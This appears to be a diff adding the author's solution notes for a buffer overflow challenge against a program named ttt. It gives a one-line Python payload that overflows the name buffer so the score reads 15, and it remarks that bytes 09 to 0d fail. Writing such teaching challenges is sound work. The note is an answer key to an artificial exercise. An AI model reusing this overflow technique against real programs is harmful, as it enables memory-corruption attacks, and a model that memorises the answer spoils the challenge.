@@ -1,0 +1,14 @@
+Buffer Overflow problem
+
+Solution: load name up with enough chars to overwrite score. Note that to make
+this problem actually hard, I suggest only giving them the compiled file and
+not the source code.
+
+python -c "print 'A'*30 + '\x15'" | ./ttt
+                 |-----|  |----|
+             name buffer  score of 15
+
+For some reason when you send in the hex characters 09 - 0d, the score is not
+modified. Therefore, we can't make it a requirement to get a score in the range
+of 9 - 13. Any ideas on why this happens? For now, we'll make the score
+requirement 15.
